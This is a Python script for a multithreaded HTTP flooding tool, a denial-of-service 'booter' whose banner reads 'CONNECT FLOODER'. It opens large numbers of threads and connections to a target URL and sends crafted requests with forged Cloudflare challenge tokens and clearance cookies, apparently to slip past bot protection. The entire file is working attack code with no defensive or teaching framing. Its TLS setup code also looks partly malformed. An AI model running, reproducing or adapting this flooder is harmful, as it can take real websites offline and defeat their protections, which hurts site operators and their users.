import socket,ssl,threading,struct,time,random,string
from fake_useragent import UserAgent
from MODEL.data import get_target,gen_id,generate_url_path,same_random,read

def datetime_to_epoch():return int(time.time())

def made_connect(target):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
     s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port'])))
     if target['scheme'] == 'https':s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])
     return s

def sender(s,byt,target):
 for _ in range(2500):
   if read() == True:break
   try:
     for _ in range(250):
        if read() == True:break
        s.sendall(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        s.sendall(byt[1]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     s.shutdown(socket.SHUT_RDWR); s.close()
     s = made_connect(target)
   except:pass

def CONNECT(target,duration_sec_attack_dude,byt):
    for _ in range(int(duration_sec_attack_dude)):
        if read() == True:break
        try:
            for _ in range(500):
                 if read() == True:break
                 threading.Thread(target=sender,args=(made_connect(target),byt,target)).start()
        except:pass

def craft(mode_uam,url,num,type,target):
   link,string_abc,head = '',string.ascii_letters+string.digits,same_random(type)
   if mode_uam == 0:link = url
   else:
      type_c = ''
      if mode_uam == 1:type_c = '__cf_chl_tk'
      elif mode_uam == 2:type_c = '__cf_chl_rt_tk'
      elif mode_uam == 3:type_c = '__cf_chl_f_tk'
      elif mode_uam == 4:type_c = '__cf_chl_captcha_tk__'
      elif mode_uam == 5:type_c = '__cf_chl_managed_tk__'
      elif mode_uam == 6:type_c = '__cf_chl_jschl_tk__'
      link = 'https://'+url.replace('https://','').replace('http://','').replace('/','')+f"/?{type_c}={generate_url_path(string=string_abc+'_.',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=4)}"
   return [f"{meth_http} {a} HTTP/1.1{type}Host: {target['host']}{type}{head[0]}{head[1]}{head[2]}{head[3]}Referer: {link}{type}Cookie: _cfuvid={generate_url_path(string=string_abc+'_.',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=random.randint(1,999999))}; __cflb={generate_url_path(string=string_abc,num=43)}; __cf_bm={generate_url_path(string=string_abc+'_',num=random.randint(1,18))}.{generate_url_path(string=string_abc,num=random.randint(1,24))}-{datetime_to_epoch()}-{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,84))}; _ga_{generate_url_path(string=string_abc,num=4)}=GS1.1.{datetime_to_epoch()}.4.1.{datetime_to_epoch()}.0.0.0; _gid=GA1.2.{generate_url_path(string='0123456789',num=9)}.{datetime_to_epoch()}; __cfduid={generate_url_path(string='abcdefghijklmnopqrstuvwxyz0123456789',num=43)}; cf_clearance={generate_url_path(string=string_abc,num=random.randint(1,21))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,21))}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,61))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,22))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,85))}; PHPSESSID={gen_id(15)}; _ym_uid={generate_url_path(string='0123456789',num=19)}; _ym_d={generate_url_path(string='0123456789',num=10)}; _ym_isad={generate_url_path(string='0123456789',num=1)}; {type}User-Agent: {UserAgent().random}{type}Connection: keep-alive, upgrade{type}Keep-Alive: timeout=1, max=250{type}TE: compress, deflate, gzip, trailers{type}DNT: 1{type}Sec-Ch-Ua: 'Not_A Brand';v='8', 'Chromium';v='120', 'Microsoft Edge';v='120'{type}Sec-Fetch-User: ?1{type}Sec-GPC: 1{type}Upgrade-Insecure-Requests: 1{type}Pragma: no-cache{type}{head[6]}{head[7]}{head[8]}{head[9]}{head[10]}{head[11]}{type}".encode() for a in [target['uri'],f'/{generate_url_path(num=num)}']]

import sys
url,time_booter,thread_lower,mode_uam,meth_http = '',0,0,0,''
if len(sys.argv) == 6:
   url,thread_lower,time_booter,meth_http,mode_uam = sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),sys.argv[4],int(sys.argv[5])
else:print(f'WELCOME TO CONNECT FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METH-HTTP> <UAM>'); exit()
num = 1
t = get_target(url)
for _ in range(int(thread_lower)):
   if read() == True:break
   for _ in range(10):
      if read() == True:break
      threading.Thread(target=CONNECT,args=(t,time_booter,craft(mode_uam,url,num,"\r\n",t))).start()
   num += 1
